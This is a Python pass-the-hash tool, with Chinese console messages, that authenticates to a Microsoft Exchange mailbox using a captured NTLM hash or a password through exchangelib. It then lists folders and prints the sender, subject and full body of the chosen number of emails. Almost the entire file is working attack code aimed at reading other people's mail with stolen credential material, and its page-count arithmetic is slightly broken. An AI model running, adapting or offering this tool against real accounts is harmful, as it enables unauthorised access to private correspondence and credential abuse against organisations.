# Read Email With NTLM Hash
# Bobac && QAX-NET-SEC


import sys
from optparse import OptionParser
from exchangelib import Account, Credentials, Configuration


def EmailAccountAuthByNtlmHash(username, ntlmhash, email, server=None, flag=True):
    try:
        if flag:
            hash = ntlmhash if ntlmhash.find(":") > 0 else "00000000000000000000000000000000:%s"%str(ntlmhash)
            print("[+] 账号:%s 认证口令NTLM-Hash:%s"%(str(username), str(hash)))
        else:
            hash = ntlmhash
    except Exception as hashexception:
        print("[-] NTLM-Hash值输入错误!")
        raise hashexception
    try:
        credentials = Credentials(username, hash)
    except Exception as credexception:
        print("[-] 凭据生成错误!")
        raise credexception
    try:
        if server == None:
            email = Account(email, credentials=credentials, autodiscover=True)
            print("[+] 邮箱账号认证登录成功")
            return email
        else:
            config = Configuration(server, credentials)
            email = Account(primary_smtp_address=email, config=config, autodiscover=False)
            return email
    except Exception as error:
        print("[+] 账号连接或认证失败")
        return None

def GetInboxFolder(email):
    try:
        inbox = email.inbox
        print("[+] 成功获取收件箱!")
        return inbox
    except Exception as error:
        print("[-] 获取收件箱失败!")
        return None

def ListAllFloder(email):
    print("[+] 列出所有文件夹")
    print(email.root.tree())

def GetOtherFloder(email, floder):
    target = email.root.glob(floder+"*")
    print("[+] 成功获取文件夹:%s"%str(floder))
    if target.folders == []:
        target = email.root.glob("*/"+floder)
        if target.folders == []:
            target = email.root.glob("**/"+floder)
            if target.folders == []:
                return None
    return target


def GetEmail(floder, count):
    emails = floder.all().order_by("-datetime_received")[:count]
    return emails

def GetEmailByPage(floder, size, page):
    start = 0
    pages = []
    for index in range(page):
        if start + size < floder.folders[0].total_count:
            pages.append(floder.all().order_by("-datetime_received")[start:start+size])
            start += size
        else:
            pages.append(floder.all().order_by("-datetime_received")[start:floder.total_count])
            break
    return pages

def DisplayEmail(emails):
    for item in emails:
        print("***************************************************************")
        print("发件人: %s"%str(item.sender))
        print("主题: %s"%str(item.subject))
        print("邮件内容: %s"%str(item.text_body))
        print("***************************************************************")


if __name__ == "__main__":
    parser = OptionParser()
    parser.add_option("-u", "--user", dest="user", help="Please Input Username: Domain\\DomainUserName!")
    parser.add_option("-H", "--hash", dest="hash", help="Please Input Ntlmhash: xx:xx Or xxxx!")
    parser.add_option("-p", "--pswd", dest="pswd", help="Please Input Password!")
    parser.add_option("-e", "--email", dest="email", help="Please Input Email Address!")
    parser.add_option("-c", "--count", dest="count", help="Please Input How Many Emails You Want To Read!")
    parser.add_option("-s", "--server", dest="server", help="Please Input Email Server Address!")
    parser.add_option("-L", "--List", dest="List", action="store_true", default=False, help="List All Email Floders!")
    parser.add_option("-d", "--display", dest="display", action="store_true",help="Show All Email Floders!")
    parser.add_option("-l", "--list", dest="list", action="store_true",help="List All Email Floders!")
    parser.add_option("-f", "--folder", dest="floder", help="Please Input Email Floder Name!")
    (options, args) = parser.parse_args()
    if options.server == None:
        if options.pswd != None and options.hash == None:
            email = EmailAccountAuthByNtlmHash(options.user, options.pswd, options.email, flag=False)
        else:
            email = EmailAccountAuthByNtlmHash(options.user, options.hash, options.email)
        if email == None:
            exit(0)
    else:
        if options.pswd != None and options.hash == None:
            email = EmailAccountAuthByNtlmHash(options.user, options.pswd, options.email, options.server, flag=False)
        else:
            email = EmailAccountAuthByNtlmHash(options.user, options.hash, options.email, options.server)
        if email == None:
            exit(0)
    if options.List == True:
        ListAllFloder(email)
        sys.exit(0)
    if options.floder != None:
        floder = GetOtherFloder(email, options.floder)
    else:
        floder = GetInboxFolder(email)
    if int(options.count) > 20:
        size = 10
        pagecount = int(options.count)/size + 1 if int(options.count)%size != 0 else int(options.count)/size + 1
        pages = GetEmailByPage(floder, size, int(pagecount))
        for page in pages:
            DisplayEmail(page)
    else:
        emails = GetEmail(floder, int(options.count))
        DisplayEmail(emails)
